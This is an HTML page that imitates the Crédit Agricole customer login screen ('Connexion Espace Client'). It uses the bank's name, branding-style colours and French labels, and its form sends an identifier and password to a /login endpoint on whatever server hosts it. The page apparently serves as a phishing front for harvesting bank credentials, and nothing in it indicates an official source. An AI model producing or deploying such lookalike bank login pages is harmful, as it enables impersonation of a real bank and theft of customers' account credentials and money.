<!DOCTYPE html>
<html>
<head>
    <title>Crédit Agricole - Connexion</title>

    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
        }

        .container {
            width: 400px;
            margin: 100px auto;
        }

        h1 {
            font-size: 30px;
            color: #2c3e50;
            margin-bottom: 10px;
        }

        h2 {
            font-size: 22px;
            margin-bottom: 30px;
        }

        .ligne-verte {
            width: 5px;
            height: 30px;
            background: #2ecc71;
            display: inline-block;
            margin-right: 10px;
        }

        label {
            display: block;
            margin-top: 25px;
            font-weight: bold;
        }

        input {
            width: 100%;
            padding: 15px;
            margin-top: 10px;
            border-radius: 10px;
            border: 1px solid #ccc;
            font-size: 16px;
        }

        .link {
            color: #2ecc71;
            font-size: 14px;
            float: right;
            margin-top: 5px;
        }

        button {
            margin-top: 30px;
            width: 100%;
            padding: 15px;
            background-color: #2ecc71;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            cursor: pointer;
        }

    </style>
</head>

<body>

<div class="container">

    <h1>CRÉDIT AGRICOLE</h1>

    <h2>
        <span class="ligne-verte"></span>
        CONNEXION ESPACE CLIENT
    </h2>

    <form method="POST" action="/login">

        <label>IDENTIFIANT :</label>
<input type="text" name="identifiant" required>

<label>MOT DE PASSE :</label>
<input type="password" name="motdepasse" required>
        

        

        
        
       

        <button type="submit">Se connecter</button>

    </form>

</div>

</body>
</html>
